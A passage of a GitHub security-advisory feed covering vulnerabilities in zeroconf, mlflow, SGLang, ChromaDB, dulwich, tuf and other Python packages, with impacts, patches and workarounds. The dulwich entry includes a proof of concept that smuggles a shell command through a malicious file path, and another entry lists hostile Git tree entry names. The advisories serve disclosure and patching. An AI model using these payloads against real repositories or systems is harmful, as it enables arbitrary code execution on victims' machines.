<li><a href="https://github.com/advisories/GHSA-phvx-9mgw-67r5">https://github.com/advisories/GHSA-phvx-9mgw-67r5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-phvx-9mgw-67r5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-29T20:13:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[zeroconf] zeroconf has unbounded recursion in DNS compression-pointer decoder that allows LAN-local denial of service]]></title>
        <id>https://github.com/advisories/GHSA-9pgc-3ccv-5297</id>
        <link href="https://github.com/advisories/GHSA-9pgc-3ccv-5297"/>
        <updated>2026-05-29T20:09:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><code>DNSIncoming._decode_labels_at_offset</code> recurses once per DNS-name compression pointer (RFC 1035 §4.1.4). Pointer cycles and label counts were capped, but the chain length of unique forward pointers was not. A single ~3 kB mDNS packet carrying ~1500 chained pointers drives the recursion past CPython's default limit, and <code>RecursionError</code> was not listed in <code>DECODE_EXCEPTIONS</code>, so it escaped <code>DNSIncoming.__init__</code> and was logged by asyncio's default exception handler.</p>
<p>Any unauthenticated host on the local link (UDP/5353, <code>224.0.0.251</code> / <code>ff02::fb</code>) can degrade the mDNS listener; that includes a guest on the same Wi-Fi, a compromised IoT device, or a container on a shared bridge. Replaying at a few hertz produces sustained CPU burn and log flooding, and mDNS-dependent features (HomeKit, Chromecast/Matter, AirPlay, printers) degrade while the attack is in flight.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <code>zeroconf</code> 0.149.5 (<a href="https://github.com/python-zeroconf/python-zeroconf/pull/1719">PR #1719</a>).
Upgrade to <code>&gt;= 0.149.5</code>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no in-process workaround; upgrading is the fix. Otherwise, restrict mDNS (UDP/5353) to trusted Layer-2 segments via AP client isolation, guest-network separation, or host firewall rules.</p>
<h3 id="resources">Resources</h3>
<ul>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/pull/1719">PR #1719</a>, fix</li>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/issues/1713">Issue #1713</a>, public tracking issue</li>
<li><a href="https://www.rfc-editor.org/rfc/rfc1035#section-4.1.4">RFC 1035 §4.1.4</a>, <a href="https://www.rfc-editor.org/rfc/rfc6762">RFC 6762</a>, <a href="https://cwe.mitre.org/data/definitions/674.html">CWE-674</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/security/advisories/GHSA-9pgc-3ccv-5297">https://github.com/python-zeroconf/python-zeroconf/security/advisories/GHSA-9pgc-3ccv-5297</a></li>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/issues/1713">https://github.com/python-zeroconf/python-zeroconf/issues/1713</a></li>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/pull/1719">https://github.com/python-zeroconf/python-zeroconf/pull/1719</a></li>
<li><a href="https://github.com/advisories/GHSA-9pgc-3ccv-5297">https://github.com/advisories/GHSA-9pgc-3ccv-5297</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9pgc-3ccv-5297</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-29T20:09:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] MLFlow Creates a Temporary File With Insecure Permissions ]]></title>
        <id>https://github.com/advisories/GHSA-f2m9-wcf4-cwwx</id>
        <link href="https://github.com/advisories/GHSA-f2m9-wcf4-cwwx"/>
        <updated>2026-05-29T19:53:37.000Z</updated>
        <content type="html"><![CDATA[<p>In mlflow/mlflow versions prior to 3.11.0, the <code>get_or_create_nfs_tmp_dir()</code> function in <code>mlflow/utils/file_utils.py</code> creates temporary directories with world-writable permissions (0o777), and the <code>_create_model_downloading_tmp_dir()</code> function in <code>mlflow/pyfunc/__init__.py</code> creates directories with group-writable permissions (0o770). These insecure permissions allow local attackers to tamper with model artifacts, such as cloudpickle-serialized Python objects, and achieve arbitrary code execution when the tampered artifacts are deserialized via <code>cloudpickle.load()</code>. This vulnerability is particularly critical in environments with shared NFS mounts, such as Databricks, where NFS is enabled by default. The issue is a continuation of the vulnerability class addressed in CVE-2025-10279, which was only partially fixed.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4137">https://nvd.nist.gov/vuln/detail/CVE-2026-4137</a></li>
<li><a href="https://github.com/mlflow/mlflow/commit/1dcbb0c2fbd1f446c328830e601ca13a28219b8a">https://github.com/mlflow/mlflow/commit/1dcbb0c2fbd1f446c328830e601ca13a28219b8a</a></li>
<li><a href="https://huntr.com/bounties/648dc30b-76c7-4433-86b8-f43d926fd8d6">https://huntr.com/bounties/648dc30b-76c7-4433-86b8-f43d926fd8d6</a></li>
<li><a href="https://github.com/advisories/GHSA-4x5p-f36r-mxxr">https://github.com/advisories/GHSA-4x5p-f36r-mxxr</a></li>
<li><a href="https://github.com/advisories/GHSA-f2m9-wcf4-cwwx">https://github.com/advisories/GHSA-f2m9-wcf4-cwwx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f2m9-wcf4-cwwx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-18T21:31:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[redshift-connector] amazon-redshift-python-driver vulnerable to Remote Code Execution via eval() Injection]]></title>
        <id>https://github.com/advisories/GHSA-29h4-r29x-hchv</id>
        <link href="https://github.com/advisories/GHSA-29h4-r29x-hchv"/>
        <updated>2026-05-29T19:32:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>amazon-redshift-python-driver is the official Python connector for Amazon Redshift. In versions 2.1.13 and earlier, the driver insufficiently validates data received from the server during query result processing. A rogue server or man-in-the-middle could leverage this to execute arbitrary code on the client.</p>
<h3 id="impact">Impact</h3>
<p>When a client connects to a rogue server implementing the PostgreSQL wire protocol, the server can send specially crafted query responses that the driver processes without adequate input validation. This could result in arbitrary code execution in the client process, potentially enabling command execution, file system access, or credential theft with the privileges of the client application.</p>
<p>Impacted versions: &lt;=2.1.13</p>
<h3 id="patches">Patches</h3>
<p>This has been addressed in amazon-redshift-python-driver version 2.1.14 (<a href="https://github.com/aws/amazon-redshift-python-driver/releases/tag/v2.1.14">https://github.com/aws/amazon-redshift-python-driver/releases/tag/v2.1.14</a>). Amazon Redshift recommends upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes.</p>
<h3 id="references">References</h3>
<p>If there are any questions or comments about this advisory, contact AWS Security via the issue reporting page or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
<h3 id="acknowledgement">Acknowledgement</h3>
<p>Amazon Redshift would like to thank Kexin Chen (@ckx-sec) for collaborating through the coordinated disclosure process.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/aws/amazon-redshift-python-driver/security/advisories/GHSA-29h4-r29x-hchv">https://github.com/aws/amazon-redshift-python-driver/security/advisories/GHSA-29h4-r29x-hchv</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-8838">https://nvd.nist.gov/vuln/detail/CVE-2026-8838</a></li>
<li><a href="https://aws.amazon.com/security/security-bulletins/2026-033-aws">https://aws.amazon.com/security/security-bulletins/2026-033-aws</a></li>
<li><a href="https://github.com/aws/amazon-redshift-python-driver/releases/tag/v2.1.14">https://github.com/aws/amazon-redshift-python-driver/releases/tag/v2.1.14</a></li>
<li><a href="https://github.com/advisories/GHSA-29h4-r29x-hchv">https://github.com/advisories/GHSA-29h4-r29x-hchv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-29h4-r29x-hchv</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-29T19:32:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[uv] uv is vulnerable to arbitrary file write through entry point names]]></title>
        <id>https://github.com/advisories/GHSA-4gg8-gxpx-9rph</id>
        <link href="https://github.com/advisories/GHSA-4gg8-gxpx-9rph"/>
        <updated>2026-05-29T19:26:33.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>In versions of uv prior to 0.11.15, when installing a distribution containing an entry point specification (under <code>console_scripts</code> or <code>gui_scripts</code>), uv would place the generated entry point according to the given name even if doing so resulted in a path outside of the environment's scripts directory.</p>
<p>A malicious wheel could use this to place an executable outside of the intended environment, including in a directory already present on the user's <code>PATH</code>. This could shadow or overwrite an existing executable and potentially result in unexpected code execution under the wheel's control, even if the wheel's installation environment was not explicitly added to <code>PATH</code> by the user.</p>
<p>In order to exploit this vulnerability, the attacker must induce their target into installing a malicious wheel.</p>
<h3 id="patches">Patches</h3>
<p>uv 0.11.15 and newer address this vulnerability. Users are encouraged to upgrade to 0.11.15.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround other than upgrading to uv 0.11.15.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/astral-sh/uv/security/advisories/GHSA-4gg8-gxpx-9rph">https://github.com/astral-sh/uv/security/advisories/GHSA-4gg8-gxpx-9rph</a></li>
<li><a href="https://github.com/advisories/GHSA-4gg8-gxpx-9rph">https://github.com/advisories/GHSA-4gg8-gxpx-9rph</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4gg8-gxpx-9rph</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-29T19:26:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[chromadb] ChromaDB Python project has a pre-authentication code injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-f4j7-r4q5-qw2c</id>
        <link href="https://github.com/advisories/GHSA-f4j7-r4q5-qw2c"/>
        <updated>2026-05-29T19:15:04.000Z</updated>
        <content type="html"><![CDATA[<p>A pre-authentication, code injection vulnerability in version 1.0.0 or later of the ChromaDB Python project allows an unauthenticated attacker to run arbitrary code on the server by sending a malicious model repository and trust_remote_code set to true in the&nbsp;/api/v2/tenants/{tenant}/databases/{db}/collections endpoint.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-45829">https://nvd.nist.gov/vuln/detail/CVE-2026-45829</a></li>
<li><a href="https://github.com/chroma-core/chroma/issues/6717">https://github.com/chroma-core/chroma/issues/6717</a></li>
<li><a href="https://www.hiddenlayer.com/research/chromatoast-served-pre-auth">https://www.hiddenlayer.com/research/chromatoast-served-pre-auth</a></li>
<li><a href="https://github.com/advisories/GHSA-f4j7-r4q5-qw2c">https://github.com/advisories/GHSA-f4j7-r4q5-qw2c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f4j7-r4q5-qw2c</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-18T18:31:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sglang] SGLang: Unauthenticated RCE via --enable-custom-logit-processor]]></title>
        <id>https://github.com/advisories/GHSA-36m8-w8qf-g76p</id>
        <link href="https://github.com/advisories/GHSA-36m8-w8qf-g76p"/>
        <updated>2026-05-29T17:29:24.000Z</updated>
        <content type="html"><![CDATA[<p>SGLang's multimodal generation runtime is vulnerable to unauthenticated remote code execution when the --enable-custom-logit-processor option is enabled, as Python objects loaded via dill.loads() will be deserialized without validation.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-7304">https://nvd.nist.gov/vuln/detail/CVE-2026-7304</a></li>
<li><a href="https://antiproof.ai/blog/three-rces-in-sglang">https://antiproof.ai/blog/three-rces-in-sglang</a></li>
<li><a href="https://github.com/sgl-project/sglang/tree/main/python/sglang">https://github.com/sgl-project/sglang/tree/main/python/sglang</a></li>
<li><a href="https://github.com/advisories/GHSA-36m8-w8qf-g76p">https://github.com/advisories/GHSA-36m8-w8qf-g76p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-36m8-w8qf-g76p</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-18T12:31:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sglang] SGLang's multimodal generation runtime has an unauthenticated path traversal vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-qwrp-wghp-94q2</id>
        <link href="https://github.com/advisories/GHSA-qwrp-wghp-94q2"/>
        <updated>2026-05-29T17:26:20.000Z</updated>
        <content type="html"><![CDATA[<p>SGLang's multimodal generation runtime is vulnerable to an unauthenticated path traversal vulnerability, allowing an attacker to write arbitrary files anywhere the server process has write access, by including ../ sequences in the upload filename when sent to specific endpoints.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-7302">https://nvd.nist.gov/vuln/detail/CVE-2026-7302</a></li>
<li><a href="https://antiproof.ai/blog/three-rces-in-sglang">https://antiproof.ai/blog/three-rces-in-sglang</a></li>
<li><a href="https://github.com/sgl-project/sglang/tree/main/python/sglang">https://github.com/sgl-project/sglang/tree/main/python/sglang</a></li>
<li><a href="https://github.com/advisories/GHSA-qwrp-wghp-94q2">https://github.com/advisories/GHSA-qwrp-wghp-94q2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qwrp-wghp-94q2</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-18T12:31:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sglang] SGLanG: Multimodal scheduler deserializes untrusted pickle data on 0.0.0.0 ROUTER socket]]></title>
        <id>https://github.com/advisories/GHSA-gwv6-pq6m-p3rq</id>
        <link href="https://github.com/advisories/GHSA-gwv6-pq6m-p3rq"/>
        <updated>2026-05-29T17:23:11.000Z</updated>
        <content type="html"><![CDATA[<p>SGLang's multimodal generation runtime scheduler's ROUTER socket binds to 0.0.0.0 by default and contains a sink that calls pickle.loads() on incoming messages, enabling RCE when exposed to the internet.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-7301">https://nvd.nist.gov/vuln/detail/CVE-2026-7301</a></li>
<li><a href="https://antiproof.ai/blog/three-rces-in-sglang">https://antiproof.ai/blog/three-rces-in-sglang</a></li>
<li><a href="https://github.com/sgl-project/sglang/tree/main/python/sglang">https://github.com/sgl-project/sglang/tree/main/python/sglang</a></li>
<li><a href="https://github.com/advisories/GHSA-gwv6-pq6m-p3rq">https://github.com/advisories/GHSA-gwv6-pq6m-p3rq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gwv6-pq6m-p3rq</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-18T12:31:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tuf] tuf has platform-dependent delegation path matching]]></title>
        <id>https://github.com/advisories/GHSA-qp9x-wp8f-qgjj</id>
        <link href="https://github.com/advisories/GHSA-qp9x-wp8f-qgjj"/>
        <updated>2026-05-28T22:46:14.000Z</updated>
        <content type="html"><![CDATA[<p><code>DelegatedRole._is_target_in_pathpattern</code> uses <code>fnmatch.fnmatch</code> to decide whether a given target path is authorized by a delegation's glob pattern.</p>
<p>Python's <code>fnmatch.fnmatch</code> calls <code>os.path.normcase()</code> on both arguments before matching. On POSIX hosts <code>normcase</code> is the identity function; on Windows hosts <code>os.path</code> resolves to <code>ntpath</code>, whose <code>normcase</code> lowercases its input and replaces <code>/</code> with <code>\</code>.</p>
<p>As a result, python-tuf's delegation <em>path pattern</em> matching is case-sensitive on Linux/macOS but case-INSENSITIVE on Windows. This makes the authorization decision for a target dependent on the host operating system of the client running the updater.</p>
<p>The result on Windows is a TUF specification violation in the python-tuf <code>ngclient</code> implementation.</p>
<h2 id="vulnerable-code">Vulnerable code</h2>
<p><code>tuf/api/_payload.py</code> (HEAD <code>7ecb67d</code>):</p>
<pre><code class="language-python">1183  @staticmethod
1184  def _is_target_in_pathpattern(targetpath: str, pathpattern: str) -&gt; bool:
1185      """Determine whether ``targetpath`` matches the ``pathpattern``."""
1186      # We need to make sure that targetpath and pathpattern are pointing to
1187      # the same directory as fnmatch doesn't threat "/" as a special symbol.
1188      target_parts = targetpath.split("/")
1189      pattern_parts = pathpattern.split("/")
1190      if len(target_parts) != len(pattern_parts):
1191          return False
1192
1193      # Every part in the pathpattern could include a glob pattern, that's why
1194      # each of the target and pathpattern parts should match.
1195      for target, pattern in zip(target_parts, pattern_parts, strict=True):
1196          if not fnmatch.fnmatch(target, pattern):
1197              return False
1198      return True
</code></pre>
<p><code>fnmatch.fnmatch</code> source (Python 3.12, unchanged in current mainline):</p>
<pre><code class="language-python">def fnmatch(name, pat):
    ...
    name = os.path.normcase(name)
    pat = os.path.normcase(pat)
    return fnmatchcase(name, pat)
</code></pre>
<h2 id="fix">Fix</h2>
<p>Replace <code>fnmatch.fnmatch</code> with <code>fnmatch.fnmatchcase</code>, which is explicitly documented as "not applying case normalization", so it behaves identically across platforms.</p>
<h2 id="attack">Attack</h2>
<ol>
<li>A TUF repository with two path-based delegations whose patterns differ only in case — for example, <code>Foo/*</code> and <code>foo/*</code>.</li>
<li>The "attacker" delegation is listed BEFORE the "legit" delegation in the delegation order.</li>
<li>The client searches for <code>foo/something</code>: on Windows, it will find the "attacker" provided target "Foo/something".</li>
</ol>
<h2 id="exploitability-caveats">Exploitability caveats</h2>
<ul>
<li>The attack needs a repository configuration with case-colliding delegation path patterns. The attacker must control one of the delegated roles.</li>
<li>Delegation ordering matters: the attacker-controlled role must be visited BEFORE the legit role in the pre-order walk.</li>
<li>The client must run on Windows. No effect on Linux/macOS.</li>
</ul>
<h2 id="credit">Credit</h2>
<p>Reporter: Koda Reef @kodareef5 
Advisory edits: Jussi Kukkonen @jku</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/theupdateframework/python-tuf/security/advisories/GHSA-qp9x-wp8f-qgjj">https://github.com/theupdateframework/python-tuf/security/advisories/GHSA-qp9x-wp8f-qgjj</a></li>
<li><a href="https://github.com/theupdateframework/python-tuf/releases/tag/v7.0.0">https://github.com/theupdateframework/python-tuf/releases/tag/v7.0.0</a></li>
<li><a href="https://github.com/advisories/GHSA-qp9x-wp8f-qgjj">https://github.com/advisories/GHSA-qp9x-wp8f-qgjj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qp9x-wp8f-qgjj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-28T22:46:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dulwich] Dulwich Vulnerable to Command Injection via Merge Driver Path]]></title>
        <id>https://github.com/advisories/GHSA-9277-mp7x-85jf</id>
        <link href="https://github.com/advisories/GHSA-9277-mp7x-85jf"/>
        <updated>2026-05-28T22:29:24.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Dulwich's <code>ProcessMergeDriver</code> substitutes the file path (from the git tree, controllable by an attacker via a malicious branch) into the merge driver command via the <code>%P</code> placeholder and executes it with <code>subprocess.run(..., shell=True)</code>. An attacker who can cause a victim to merge an untrusted branch can achieve arbitrary command execution by crafting malicious file paths.</p>
<h2 id="description">Description</h2>
<ul>
<li><strong>Type:</strong> Command Injection</li>
<li><strong>Source:</strong> <code>merge.py</code> line 195 — path from merge tree (from repository content when merging untrusted branch)</li>
<li><strong>Sink:</strong> <code>merge_drivers.py</code> lines 124–127 — <code>subprocess.run(cmd, shell=True)</code> where <code>cmd</code> includes path via <code>%P</code> placeholder</li>
<li><strong>Impact:</strong> Arbitrary code execution when merging from a malicious repository. Requires the user to have a merge driver configured that uses the <code>%P</code> placeholder.</li>
</ul>
<h2 id="resources">Resources</h2>
<ul>
<li>Repository: <a href="https://github.com/dulwich/dulwich">https://github.com/dulwich/dulwich</a></li>
<li>Vulnerable file: <code>dulwich/merge_drivers.py</code> (lines 119–129)</li>
</ul>
<h2 id="proof-of-concept">Proof of Concept</h2>
<pre><code class="language-python">from dulwich.attrs import GitAttributes, Pattern
from dulwich.config import ConfigDict
from dulwich.merge import merge_blobs
from dulwich.objects import Blob

# Merge driver with %P (path) - typical for custom merge tools
config = ConfigDict()
config.set((b"merge", b"injectable"), b"driver", b"echo %P &gt; %A")

patterns = [(Pattern(b"*"), {b"merge": b"injectable"})]
gitattributes = GitAttributes(patterns)

base = Blob.from_string(b"base")
ours = Blob.from_string(b"ours")
theirs = Blob.from_string(b"theirs")

# Malicious path from attacker-controlled git tree: injects "touch /tmp/pwned"
malicious_path = b"x; touch /tmp/pwned #"

merge_blobs(base, ours, theirs, path=malicious_path,
            gitattributes=gitattributes, config=config)
# =&gt; Executes: echo x; touch /tmp/pwned #
# =&gt; Shell runs: echo x, then touch /tmp/pwned
</code></pre>
<h2 id="fix">Fix</h2>
<p><a href="https://github.com/user-attachments/files/27016503/merge_drivers_shell_escape.patch">merge_drivers_shell_escape.patch</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jelmer/dulwich/security/advisories/GHSA-9277-mp7x-85jf">https://github.com/jelmer/dulwich/security/advisories/GHSA-9277-mp7x-85jf</a></li>
<li><a href="https://github.com/jelmer/dulwich/releases/tag/dulwich-1.2.5">https://github.com/jelmer/dulwich/releases/tag/dulwich-1.2.5</a></li>
<li><a href="https://github.com/advisories/GHSA-9277-mp7x-85jf">https://github.com/advisories/GHSA-9277-mp7x-85jf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9277-mp7x-85jf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-28T22:29:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dulwich] Dulwich has an arbitrary file write via NTFS-hostile tree entries on Windows]]></title>
        <id>https://github.com/advisories/GHSA-897w-fcg9-f6xj</id>
        <link href="https://github.com/advisories/GHSA-897w-fcg9-f6xj"/>
        <updated>2026-05-28T22:28:06.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>Arbitrary file write leading to remote code execution when cloning or checking out a malicious Git repository on Windows.</p>
<p>Dulwich's path-element validator accepted tree entries whose filenames contained bytes that Windows interprets as structural path syntax:</p>
<ul>
<li>\ — the Windows path separator. A single tree entry named .git\hooks\pre-commit.exe was treated as one valid filename on POSIX but materialized as nested directories .git/hooks/pre-commit.exe on Windows, planting a file inside the victim's .git directory. Git for Windows then
  executes that hook on the next git commit, giving the attacker arbitrary code execution in the victim's user context. The same primitive can be used with ..\outside.txt to escape the work tree.</li>
<li>: — the NTFS alternate-data-stream marker. .git::$INDEX_ALLOCATION writes directly into the victim's .git entity, bypassing the .git-as-a-directory check.</li>
<li>git<del> — NTFS 8.3 short-name aliases of .git. Only the literal git</del>1 was rejected; git<del>2, git</del>10, GIT~1, etc. were all accepted.</li>
</ul>
<p>Contributing configuration bugs made matters worse. The core.protectNTFS and core.protectHFS settings were looked up under a wrong option name and so user-set values were silently ignored, and core.protectNTFS only defaulted to true on Windows (Git upstream has defaulted it to true everywhere since CVE-2019-1353). Both have been corrected.</p>
<p>Anyone who clones, fetches, or checks out an untrusted repository with Dulwich on Windows - either through the Dulwich CLI, porcelain.clone, or any downstream tool built on Dulwich - is impacted. POSIX clones are not directly exploitable (on POSIX \ is a literal filename byte), but a POSIX user can unknowingly propagate a malicious tree to Windows consumers via push or re-publication.</p>
<h2 id="patches">Patches</h2>
<p>Fixed in Dulwich 1.2.5. Users should upgrade to 1.2.5 or later.</p>
<p>The fix lives in three commits:</p>
<ul>
<li>Read core.protectNTFS / core.protectHFS under their documented option names so user-set values are honored.</li>
<li>Default core.protectNTFS to true on every platform, matching Git's PROTECT_NTFS_DEFAULT=1.</li>
<li>Reject , :, and all git~ 8.3 short-name forms in validate_path_element_ntfs.</li>
</ul>
<h2 id="workarounds">Workarounds</h2>
<p>There is no effective pre-patch workaround. On affected versions the core.protectNTFS configuration key was silently ignored, so setting it to true does not mitigate the issue. Users who cannot upgrade should avoid cloning, fetching, or checking out untrusted repositories with Dulwich on Windows. After upgrading the NTFS validator is on by default on every platform, so no additional configuration is required.</p>
<h2 id="resources">Resources</h2>
<ul>
<li>Git upstream path validation: <a href="https://github.com/git/git/blob/master/path.c">https://github.com/git/git/blob/master/path.c</a> (is_ntfs_dotgit, verify_path)</li>
<li>CVE-2019-1353 — the Git upstream vulnerability that established core.protectNTFS = true as the cross-platform default</li>
<li>CVE-2019-1354 — backslash-in-tree-path class in Git, analogous to this issue</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jelmer/dulwich/security/advisories/GHSA-897w-fcg9-f6xj">https://github.com/jelmer/dulwich/security/advisories/GHSA-897w-fcg9-f6xj</a></li>
<li><a href="https://github.com/jelmer/dulwich/releases/tag/dulwich-1.2.5">https://github.com/jelmer/dulwich/releases/tag/dulwich-1.2.5</a></li>
<li><a href="https://github.com/advisories/GHSA-897w-fcg9-f6xj">https://github.com/advisories/GHSA-897w-fcg9-f6xj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-897w-fcg9-f6xj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-28T22:28:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[shamefile] Shamefile has an arbitrary file read via shamefile.yaml in shame next]]></title>
        <id>https://github.com/advisories/GHSA-x6p3-76f2-xxvh</id>
        <link href="https://github.com/advisories/GHSA-x6p3-76f2-xxvh"/>
        <updated>2026-05-28T20:02:16.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A path traversal vulnerability in <code>shame next</code> allows an attacker-controlled <code>shamefile.yaml</code> to disclose contents of files outside the repository, one line at a time, to the terminal of a user who runs the command. See patch commit for technical details.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in 0.1.7. Upgrade to either 0.1.7 or later versions to incorporate the patch.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Do not run <code>shame next</code> against untrusted <code>shamefile.yaml</code>. Use <code>shame me --dry-run</code> for CI validation.</p>
<h3 id="resources">Resources</h3>
<ul>
<li>Patch commit: <a href="https://github.com/BKDDFS/shamefile/commit/77b0aeea318503582818c708518c601fedc43557">https://github.com/BKDDFS/shamefile/commit/77b0aeea318503582818c708518c601fedc43557</a></li>
<li>Pull request: <a href="https://github.com/BKDDFS/shamefile/pull/80">https://github.com/BKDDFS/shamefile/pull/80</a></li>
<li>Release: <a href="https://github.com/BKDDFS/shamefile/releases/tag/v0.1.7">https://github.com/BKDDFS/shamefile/releases/tag/v0.1.7</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/22.html">CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/BKDDFS/shamefile/security/advisories/GHSA-x6p3-76f2-xxvh">https://github.com/BKDDFS/shamefile/security/advisories/GHSA-x6p3-76f2-xxvh</a></li>
<li><a href="https://github.com/BKDDFS/shamefile/pull/80">https://github.com/BKDDFS/shamefile/pull/80</a></li>
<li><a href="https://github.com/BKDDFS/shamefile/commit/77b0aeea318503582818c708518c601fedc43557">https://github.com/BKDDFS/shamefile/commit/77b0aeea318503582818c708518c601fedc43557</a></li>
<li><a href="https://github.com/BKDDFS/shamefile/releases/tag/v0.1.7">https://github.com/BKDDFS/shamefile/releases/tag/v0.1.7</a></li>
<li><a href="https://github.com/advisories/GHSA-x6p3-76f2-xxvh">https://github.com/advisories/GHSA-x6p3-76f2-xxvh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x6p3-76f2-xxvh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-28T20:02:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[local-deep-research] local-deep-research has an SSRF bypass in `safe_get`]]></title>
        <id>https://github.com/advisories/GHSA-g23j-2vwm-5c25</id>
        <link href="https://github.com/advisories/GHSA-g23j-2vwm-5c25"/>
        <updated>2026-05-28T19:18:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The URL checking logic in local-deep-research has a logical flaw that could be bypassed by attackers, leading to SSRF attacks.</p>
<h3 id="details">Details</h3>
<p>The current project uses <code>validate_url</code> to validate the input URL. The main logic is to perform security checks on the host portion of the URL extracted by urlparse to prevent SSRF attacks.</p>
<img src="https://github.com/user-attachments/assets/52b356aa-9ad3-4b1d-a472-39a2ada3ea23" alt="QQ20260430-212334-30-1" height="1107" width="1173">

<p>However, there are indeed differences in parsing between urlparse and the library that actually sends the request. For example, in <code>safe_get</code>, <code>validate_url</code> is first used to perform an SSRF check, and then <code>requests.get</code> is used to send the actual request.</p>
